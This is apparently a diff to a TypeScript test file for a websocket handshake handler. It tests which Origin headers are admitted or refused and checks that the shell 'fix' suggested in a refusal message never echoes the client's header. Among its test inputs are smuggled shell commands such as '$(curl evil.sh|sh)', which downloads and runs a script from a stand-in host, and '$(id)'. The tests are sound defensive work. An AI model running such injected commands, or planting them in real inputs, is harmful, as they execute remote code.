@@ -19,6 +19,7 @@ const upgrades = (): { server: UpgradeTarget; count: () => number } => {
         taken += 1;
         return true;
       },
+      requestIP: () => null,
     },
     count: () => taken,
   };
@@ -33,6 +34,7 @@ const deps = (overrides: Partial<UpgradeDeps> = {}): UpgradeDeps => ({
   ready: () => true,
   socketCount: () => 0,
   newSocketId: () => 'sock-1',
+  healthDetailPeers: ['loopback'],
   onGranted: () => undefined,
   onUngranted: () => undefined,
   ...overrides,
@@ -42,12 +44,119 @@ const dial = (headers: Record<string, string> = {}, url = 'https://app.example.c
   new Request(url, { headers });
 
 describe('the upgrade refuses a foreign origin', () => {
-  test('a page on the app’s own host is admitted, whatever its port or scheme', async () => {
+  test('a page on the node’s own origin is admitted', async () => {
     const { server, count } = upgrades();
-    for (const origin of ['https://app.example.com', 'http://app.example.com:3000']) {
-      expect(await handleUpgrade(deps(), dial({ origin }), server)).toBeUndefined();
-    }
+    expect(
+      await handleUpgrade(deps(), dial({ origin: 'https://app.example.com' }), server),
+    ).toBeUndefined();
+    // `x dev`: the page and the socket are one listener on localhost.
+    expect(
+      await handleUpgrade(
+        deps(),
+        dial({ origin: 'http://localhost:3000' }, 'http://localhost:3000/_x/sync'),
+        server,
+      ),
+    ).toBeUndefined();
     expect(count()).toBe(2);
+  });
+
+  // Cookies are not isolated by port or by scheme, so a page on the same HOST NAME is not this
+  // app: another port is another listener, and plain http is content anyone on the path can write.
+  for (const origin of [
+    'https://app.example.com:8443',
+    'http://app.example.com',
+    'http://app.example.com:3000',
+  ]) {
+    test(`the same host name on another port or scheme is refused: ${origin}`, async () => {
+      const { server, count } = upgrades();
+      const response = await handleUpgrade(deps(), dial({ origin }), server);
+      expect(response?.status).toBe(403);
+      expect(count()).toBe(0);
+    });
+  }
+
+  test('a page on another port is admitted once its origin is listed', async () => {
+    const { server } = upgrades();
+    const node = deps({ allowedOrigins: ['http://app.example.com:3000'] });
+    const url = 'http://app.example.com:3001/_x/sync';
+    expect(
+      await handleUpgrade(node, dial({ origin: 'http://app.example.com:3000' }, url), server),
+    ).toBeUndefined();
+    expect(
+      (await handleUpgrade(node, dial({ origin: 'http://app.example.com:3002' }, url), server))
+        ?.status,
+    ).toBe(403);
+  });
+
+  // Behind a TLS-terminating proxy the node sees plain http for a host its pages are served on
+  // over https. The declared origin is that host's public spelling, so the as-seen one is not.
+  test('a declared origin for the node’s own host replaces the origin the node sees', async () => {
+    const { server } = upgrades();
+    const node = deps({ allowedOrigins: ['https://app.example.com'] });
+    const url = 'http://app.example.com/_x/sync';
+    expect(
+      await handleUpgrade(node, dial({ origin: 'https://app.example.com' }, url), server),
+    ).toBeUndefined();
+    expect(
+      (await handleUpgrade(node, dial({ origin: 'http://app.example.com' }, url), server))?.status,
+    ).toBe(403);
+  });
+
+  // The PaaS and the Ingress rungs: TLS ends at a proxy, so the node is reached over plain http
+  // for a host its pages are served on over https — and a browser sends no `sec-fetch-site` on a
+  // websocket handshake (measured, Chrome: `Origin` and nothing else). With no `APP_URL` the
+  // scheme is not knowable here, so the https spelling of the SAME host and port is this app too.
+  // Refusing it admitted only `http://` — the one spelling such a deployment never serves.
+  test('a node reached over plain http admits the https spelling of its own host and port', async () => {
+    const { server, count } = upgrades();
+    const url = 'http://app.example.com/_x/sync';
+    expect(
+      await handleUpgrade(deps(), dial({ origin: 'https://app.example.com' }, url), server),
+    ).toBeUndefined();
+    expect(count()).toBe(1);
+    for (const origin of [
+      'https://app.example.com:8443', // another port is still another listener
+      'https://www.example.com', // and another host another site
+    ]) {
+      expect((await handleUpgrade(deps(), dial({ origin }, url), server))?.status).toBe(403);
+    }
+    // The port is part of it: a node on :3001 admits https on :3001, never the bare host.
+    const onPort = 'http://app.example.com:3001/_x/sync';
+    expect(
+      await handleUpgrade(deps(), dial({ origin: 'https://app.example.com:3001' }, onPort), server),
+    ).toBeUndefined();
+    expect(
+      (await handleUpgrade(deps(), dial({ origin: 'https://app.example.com' }, onPort), server))
+        ?.status,
+    ).toBe(403);
+  });
+
+  // The origin the node sees comes from the `Host` header. With a `Domain=`-wide session cookie,
+  // a sibling subdomain pointed at this node is "the node's own origin" by that reading.
+  test('once an origin is declared, the Host-derived one is not admitted beside it', async () => {
+    const { server, count } = upgrades();
+    const node = deps({ allowedOrigins: ['https://app.example.com'] });
+    const rebound = 'https://evil.example.com/_x/sync';
+    const response = await handleUpgrade(
+      node,
+      dial({ origin: 'https://evil.example.com' }, rebound),
+      server,
+    );
+    expect(response?.status).toBe(403);
+    expect(count()).toBe(0);
+    // The declared page is admitted whatever host the node was reached on.
+    expect(
+      await handleUpgrade(node, dial({ origin: 'https://app.example.com' }, rebound), server),
+    ).toBeUndefined();
+  });
+
+  test('the browser’s own same-origin verdict is admitted whatever the node sees', async () => {
+    const { server } = upgrades();
+    const dialled = dial(
+      { origin: 'https://app.example.com', 'sec-fetch-site': 'same-origin' },
+      'http://app.example.com/_x/sync',
+    );
+    expect(await handleUpgrade(deps(), dialled, server)).toBeUndefined();
   });
 
   // A sibling subdomain is same-site, so a SameSite=Lax session cookie rides its socket.
@@ -160,10 +269,38 @@ describe('a reconnect herd reaches authenticate bounded by the burst', () => {
 });
 
 describe('the origin refusal', () => {
-  // A fix is a command an agent can run, never a sentence.
-  test('its fix is the export that admits the page origin', () => {
-    expect(new SocketOriginRefusedError({ reason: 'x' }).fix).toStartWith(
-      'export APP_URL="https://www.example.com"',
+  const refusal = (asked: string | null, admitted: readonly string[] = []) =>
+    new SocketOriginRefusedError({ reason: 'x', asked, admitted });
+
+  // A fix is a command an agent can run, never a sentence — and it names the origin that asked.
+  test('its fix is the export that admits the origin that asked', () => {
+    expect(refusal('https://app.example.com').fix).toStartWith(
+      'export APP_URL=https://app.example.com ',
     );
   });
+
+  test('its cause names the origin that asked and every origin the node admits', () => {
+    const { cause } = refusal('https://app.example.com/', ['https://www.example.com']);
+    expect(cause).toContain('asked from https://app.example.com;');
+    expect(cause).toEndWith('admits only https://www.example.com');
+    expect(refusal('https://app.example.com').cause).toContain('no APP_URL declared');
+  });
+
+  // The header is the client's. Only what a URL parser reads as an origin travels, and only when
+  // the shell screen carries it: anything else is a fixed word, in the cause and the fix alike.
+  for (const hostile of [
+    'https://x.test/$(curl evil.sh|sh)',
+    '$(id)',
+    'null',
+    'http://[::1]:3000',
+  ]) {
+    test(`a header that is not a plain origin is never echoed: ${hostile}`, () => {
+      const error = refusal(hostile);
+      expect(`${error.cause}${error.fix}`).not.toContain('$(');
+      expect(`${error.cause}${error.fix}`).not.toContain('[');
+      if (URL.parse(hostile) === null || hostile.includes('[')) {
+        expect(error.fix).toStartWith('export APP_URL=https://www.example.com ');
+      }
+    });
+  }
 });
